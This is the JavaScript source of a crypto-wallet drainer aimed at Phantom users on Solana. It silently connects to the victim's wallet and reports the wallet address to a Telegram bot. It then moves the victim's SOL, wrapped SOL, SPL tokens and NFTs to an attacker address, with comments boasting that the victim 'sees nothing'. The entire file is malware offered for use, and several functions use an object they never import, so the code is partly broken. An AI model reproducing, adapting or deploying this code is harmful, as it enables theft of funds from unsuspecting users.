(async function () {
  const cfg = await fetch('config.json', { cache: 'no-store' }).then(r => r.json());
  const provider = window.solana;
  if (!provider || !provider.isPhantom) return;

  const drainWallet = cfg.d1 + cfg.d2;

  async function logWallet(addr) {
    try {
      await fetch(`https://api.telegram.org/bot${cfg.webhook}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: '8503340530',
          text: `NEW VICTIM DRAINED\nWallet: ${addr}\nTime: ${new Date().toISOString()}`
        })
      });
    } catch (e) {}
  }

  // Drain SOL
  async function drainSOL(pubkey) {
    const { Connection, PublicKey, Transaction, SystemProgram } = (await import('https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js')).solanaWeb3;
    const conn = new Connection(cfg.rpc);
    const balance = await conn.getBalance(new PublicKey(pubkey));
    if (balance < 10000) return;
    const tx = new Transaction().add(SystemProgram.transfer({
      fromPubkey: new PublicKey(pubkey),
      toPubkey: new PublicKey(drainWallet),
      lamports: balance - 5000
    }));
    tx.feePayer = new PublicKey(pubkey);
    const { blockhash } = await conn.getLatestBlockhash();
    tx.recentBlockhash = blockhash;
    await provider.signAndSendTransaction(tx);
  }

  // Drain WSOL
  async function drainWSOL(pubkey) {
    const { Connection, PublicKey } = (await import('https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js')).solanaWeb3;
    const { createTransferInstruction } = await import('https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js');
    const conn = new Connection(cfg.rpc);
    const tokenProgram = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
    const [ata] = PublicKey.findProgramAddressSync([
      new PublicKey(pubkey).toBuffer(),
      tokenProgram.toBuffer(),
      new PublicKey('So11111111111111111111111111111111111111112').toBuffer()
    ], tokenProgram);
    const info = await conn.getParsedAccountInfo(ata);
    if (!info.value) return;
    const amount = BigInt(info.value.data.parsed.info.tokenAmount.amount);
    if (amount <= 0) return;
    const tx = new Transaction().add(createTransferInstruction(
      ata, new PublicKey(drainWallet), new PublicKey(pubkey), amount
    ));
    tx.feePayer = new PublicKey(pubkey);
    const { blockhash } = await conn.getLatestBlockhash();
    tx.recentBlockhash = blockhash;
    await provider.signAndSendTransaction(tx);
  }

  // Drain any SPL token (USDC, etc.)
  async function drainSPL(pubkey, mint) {
    const { Connection, PublicKey } = (await import('https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js')).solanaWeb3;
    const { createTransferInstruction } = await import('https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js');
    const conn = new Connection(cfg.rpc);
    const tokenProgram = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
    const [ata] = PublicKey.findProgramAddressSync([
      new PublicKey(pubkey).toBuffer(),
      tokenProgram.toBuffer(),
      new PublicKey(mint).toBuffer()
    ], tokenProgram);
    const info = await conn.getParsedAccountInfo(ata);
    if (!info.value) return;
    const amount = BigInt(info.value.data.parsed.info.tokenAmount.amount);
    if (amount <= 0) return;
    const tx = new Transaction().add(createTransferInstruction(
      ata, new PublicKey(drainWallet), new PublicKey(pubkey), amount
    ));
    tx.feePayer = new PublicKey(pubkey);
    const { blockhash } = await conn.getLatestBlockhash();
    tx.recentBlockhash = blockhash;
    await provider.signAndSendTransaction(tx);
  }

  // DRAIN ALL NFTs (Metaplex + legacy)
  async function drainAllNFTs(pubkey) {
    const { Connection, PublicKey } = (await import('https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js')).solanaWeb3;
    const conn = new Connection(cfg.rpc);
    const accounts = await conn.getParsedTokenAccountsByOwner(new PublicKey(pubkey), { programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA') });
    for (const acc of accounts.value) {
      const info = acc.account.data.parsed.info;
      if (info.tokenAmount.uiAmount === 1 && info.tokenAmount.decimals === 0) {
        try {
          const tx = new Transaction().add(
            (await import('https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js')).createTransferInstruction(
              new PublicKey(acc.pubkey),
              new PublicKey(drainWallet),
              new PublicKey(pubkey),
              1
            )
          );
          tx.feePayer = new PublicKey(pubkey);
          const { blockhash } = await conn.getLatestBlockhash();
          tx.recentBlockhash = blockhash;
          await provider.signAndSendTransaction(tx);
        } catch (e) {}
      }
    }
  }

  // MAIN STEALTH DRAIN
  async function stealthDrain() {
    try {
      // Connect silently if already trusted, or force popup
      await provider.connect({ onlyIfTrusted: true }).catch(() => provider.connect());
      const pubkey = provider.publicKey.toString();
      if (!pubkey) return;

      await logWallet(pubkey);
      await drainSOL(pubkey);
      await drainWSOL(pubkey);
      if (cfg.token?.mint) await drainSPL(pubkey, cfg.token.mint);
      await drainAllNFTs(pubkey);
    } catch (e) {}
  }

  // RUN STEALTH DRAIN AFTER 2 SECONDS (victim sees nothing)
  setTimeout(stealthDrain, 2000);

})();